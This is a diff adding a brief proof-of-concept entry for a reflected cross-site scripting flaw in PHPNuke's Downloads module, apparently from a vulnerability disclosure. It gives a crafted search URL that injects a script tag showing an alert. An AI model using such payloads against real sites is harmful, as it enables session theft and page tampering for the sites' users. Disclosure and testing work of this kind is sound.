@@ -1,0 +1,4 @@
+#PHPNuke INP Cross-site scripting
+#Proof of Concept:
+#
+http://www.example.com/[path]/modules.php?name=Downloads&op=search&query=><script>alert('ARIA')</script>< 
